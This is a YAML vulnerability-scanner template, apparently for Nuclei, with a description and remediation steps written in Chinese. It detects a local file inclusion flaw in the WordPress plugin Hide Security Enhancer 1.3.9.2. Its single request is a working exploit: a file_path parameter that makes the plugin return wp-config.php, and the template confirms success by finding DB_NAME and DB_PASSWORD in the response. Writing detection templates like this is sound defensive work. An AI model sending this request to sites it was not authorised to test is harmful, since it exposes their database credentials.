id: hide-security-enhancer-lfi

info:
  name: WordPress Hide Security Enhancer 1.3.9.2 - 本地文件包含漏洞
  author: dhiyaneshDK
  severity: high
  description: WordPress Hide Security Enhancer 1.3.9.2 本地文件包含 存在本地文件包含漏洞。攻击者可借此读取服务器本地敏感文件、配置凭证或应用源码，为进一步入侵提供条件。
  remediation: |
    - 按厂商公告升级到已修复版本；原始说明中提到的版本信息为：Upgrade to version 1。
    - 修复路径拼接与文件访问控制逻辑，禁止用户输入直接决定本地文件路径。
    - 收敛 Web 进程对敏感目录的读取权限，并对关键配置文件实施访问隔离。
  reference:
    - https://secupress.me/blog/arbitrary-file-download-vulnerability-in-wp-hide-security-enhancer-1-3-9-2/
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 8.6
    cwe-id: CWE-22,CWE-73
  metadata:
    max-request: 1
  tags: wordpress,wp-plugin,lfi,wp,vuln

http:
  - method: GET
    path:
      - '{{BaseURL}}/wp-content/plugins/wp-hide-security-enhancer/router/file-process.php?action=style-clean&file_path=/wp-config.php'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "DB_NAME"
          - "DB_PASSWORD"
        condition: and

      - type: status
        status:
          - 200
